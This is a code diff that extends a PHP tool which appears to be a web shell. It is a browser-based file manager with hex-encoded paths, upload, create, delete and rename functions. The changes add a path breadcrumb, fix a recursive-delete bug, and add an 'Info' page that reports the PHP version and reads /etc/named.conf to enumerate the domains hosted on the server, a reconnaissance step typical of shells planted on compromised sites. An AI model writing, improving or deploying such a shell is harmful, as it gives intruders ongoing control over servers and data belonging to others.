@@ -82,8 +82,9 @@
 		font-family: 'Titillium Web', sans-serif;
 		width:100%;
 	}
-	div.edit, div.createfile, div.chname {
+	div.edit, div.createfile, div.chname, div.infos {
 		padding:10px;
+		width:100%;
 	}
 	textarea {
 		border: 1px solid #e6e6e6;
@@ -139,6 +140,12 @@
 	}
 	td.act {
 		width:10%;
+	}
+	.size {
+		float: right;
+	}
+	.perms {
+		text-align: center;
 	}
 	textarea::placeholder {
 		color: red;
@@ -295,7 +302,10 @@
 	<?php
 	class x {
 		public static $cwd;
+		public static $path;
+		public static $link;
 		public static $angka;
+		public static $result;
 		public static $handle;
 		public static $extension;
 		public static function cwd() {
@@ -339,6 +349,25 @@
 					break;
 			}
 		}
+		
+		public static function pwd() {
+			self::$path = explode(DIRECTORY_SEPARATOR, self::cwd());
+			self::$result = '';
+			foreach (self::$path as $key => $value) {
+				if ($value == '' && $key == 0) {
+					self::$result = "<a href='?cd=".self::hex(DIRECTORY_SEPARATOR)."'>".DIRECTORY_SEPARATOR."</a>";
+					continue;
+				} if ($value == '') continue;
+				self::$result .= "<a href='?cd=";
+				self::$link = '';
+				for ($i=0; $i < $key ; $i++) { 
+					self::$link .= self::$path[$i];
+					if ($i != $key) self::$link .= DIRECTORY_SEPARATOR;
+				}
+				self::$result .= self::hex(self::$link);
+				self::$result .= "'>{$value}</a>".DIRECTORY_SEPARATOR."";
+			} return self::$result;
+		}
 		public static function perms($filename) {
 			return substr(sprintf("%o", fileperms($filename)), -4);
 		}
@@ -354,12 +383,39 @@
             	return "<font color='red'>{$perms}</font>";
         	}
     	}
+    	public static function info($info = null) {
+    		switch ($info) {
+    			case 'phpversion':
+    				return phpversion();
+    				break;
+    			case 'domain':
+    				$domain = @file("/etc/named.conf", false);
+    				if (!$domain) {
+    					$result = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+						$GLOBALS["need_to_update_header"] = "true";
+    				} else {
+    					$count = 0;
+    					foreach ($domain as $key => $value) {
+    						if (strstr($value, "zone")) {
+    							if (preg_match_all('#zone "(.*)"#', $value, $domain)) {
+    								flush();
+    								if (strlen(trim($domain[1][0])) > 2) {
+    									flush();
+    									$count++;
+    								}
+    							}
+    						}
+    					} return $result . "Domain";
+    				}
+    			break;
+    		}
+    	}
     	public static function delete($filename) {
     		if (is_dir($filename)) {
     			foreach (scandir($filename) as $key => $file) {
     				if ($file != '.' && $file != '..') {
     					if (is_dir($filename . DIRECTORY_SEPARATOR . $file)) {
-    						self::delet($filename . DIRECTORY_SEPARATOR . $file);
+    						self::delete($filename . DIRECTORY_SEPARATOR . $file);
     					} else {
     						unlink($filename . DIRECTORY_SEPARATOR . $file);
     					}
@@ -378,7 +434,7 @@
     		}
     	}
     	public static function countDir($filename) {
-    		return count(scandir($filename)) -2;
+    		return @count(scandir($filename)) -2;
     	}
     	public static function getimg($filename) {
         	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
@@ -457,11 +513,11 @@
         	return date("F d Y g:i:s", filemtime($filename));
     	}
     	public static function sortname($filename) {
-    		if ($filename > 28) {
-    			return substr(htmlspecialchars($filename), 0, 28).'...';
+    		if (strlen($filename) > 18) {
+    			$result = substr($filename, 0, 18)."...";
     		} else {
-    			return $filename;
-    		}
+    			$result = $filename;
+    		} return $result;
     	}
     	public static function chname($filename, $newname) {
     		return rename($filename, $newname);
@@ -485,7 +541,7 @@
 	?>
 	<div class="row">
 		<div class="col-xs-2 tool">
-			<a href="#">
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&info">
 				<img src="https://image.flaticon.com/icons/svg/785/785822.svg" class="icons">
 				<span>Info</span>
 			</a>
@@ -497,7 +553,7 @@
 				<img src="https://image.flaticon.com/icons/svg/892/892311.svg" class="icons">
 				<span>Upload</span>
 			</a>
-			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=createfile">
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=make">
 				<img src="https://image.flaticon.com/icons/svg/2921/2921226.svg" class="icons">
 				<span>Add File</span>
 			</a>
@@ -524,8 +580,27 @@
 		</div>
 		<div class="col-xs-10 center">
 			<?php
+			if (isset($_GET['info'])) {
+				?>
+				<div class="infos">
+					<table width="100%">
+						<tr>
+							<td>PHP Version</td>
+							<td>:</td>
+							<td><?= x::info("phpversion") ?></td>
+						</tr>
+						<tr>
+							<td>Domain</td>
+							<td>:</td>
+							<td><?= x::info("domain") ?></td>
+						</tr>
+					</table>
+				</div>
+				<?php
+				exit();
+			}
 			switch (isset($_GET['x'])) {
-				case 'createfile':
+				case 'make':
 					if (isset($_POST['submit'])) {
 						switch ($_POST['type']) {
 							case 'file':
@@ -697,10 +772,10 @@
 				}
 				?><table width="100%">
 					<tr>
-						<td colspan="5">cwd</td>
+						<td colspan="5"><?= x::pwd() ?></td>
 					</tr>
 				<?php
-				foreach (x::files('dir') as $key => $dir) { ?>
+				foreach (x::files('dir') as $dir) { ?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td class="img">
@@ -726,7 +801,13 @@
 						</tr>
 					</form>
 				<?php }
-				foreach (x::files('file') as $key => $file) { ?>
+				foreach (x::files('file') as $file) {
+					if (strlen($file['name']) > 28) {
+						$filename = substr($file['name'], 0, 28)."...-.". pathinfo($file['name'], PATHINFO_EXTENSION);
+					} else {
+						$filename = $file['name'];
+					}
+					?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td>
@@ -734,7 +815,7 @@
 							</td>
 							<td>
 								<span title="<?= basename($file['name']) ?>">
-									<?= x::sortname(basename($file['name'])) ?>
+									<?= basename($filename) ?>
 								</span>
 							</td>
 							<td class="size">
